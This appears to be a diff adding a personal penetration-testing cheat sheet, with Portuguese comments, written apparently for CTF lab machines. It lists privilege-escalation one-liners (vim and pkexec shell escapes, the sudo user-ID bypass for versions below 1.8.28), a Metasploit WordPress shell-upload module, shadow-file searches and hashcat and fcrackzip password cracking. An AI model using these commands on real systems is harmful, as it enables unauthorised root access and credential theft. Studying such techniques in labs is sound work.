@@ -1,0 +1,44 @@
+my ip = 10.8.90.150
+ip machine = 10.10.2.223
+
+
+
+
+
+python -c "import pty; pty.spawn('/bin/bash')" #usar em shell
+
+exploit/unix/webapp/wp_admin_shell_upload #wordpress
+
+sudo -l #listar permissões
+
+sudo vim -c ":!/bin/sh" #caso tenhamos acesso ao vim
+
+pas #ftp passive mode (caso não seja possivel usar nenhum comando)
+
+sudo pkexec /bin/bash #caso tenhamos permissão de utilizar o pkexec
+
+steghide extract -sf $imagem$.jpg #extrair img
+
+crontab --help #tentar em linux
+
+man scp #copiar arquivos de uma maquina
+
+sudo --version #verificar versão do sudo
+
+sudo -u \#$((0xffffffff)) /bin/bash #caso seja inferior a 1.8.28
+
+hashcat -a 0 #tipoDeAtaque -m 1800 #moduloNumero hash /home/yagho/Documentos/rockyou.txt
+
+grep -nr '#string' #procurar string especifica em todos os arquivos
+
+grep -nr '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' #procurar ip em todos os arquivos
+
+sha1sum #file  #transformar arquivos em hash(checando a integridade)
+
+find / -name "*shadow" -exec ls -lt {} \; 2>/dev/null #achar arquivos com "shadow" a partir da raiz geralmente contem as senhas(hash) de usuarios caso tenhamos permissão
+
+:18234:0:99999:7::: #parte final com 3 pontos em um hash não conta
+
+exiftool #image.jpg #metadados padrões
+
+fcrackzip -vbDp <path-to-rockyou.txt> <filename> #quebrar zips
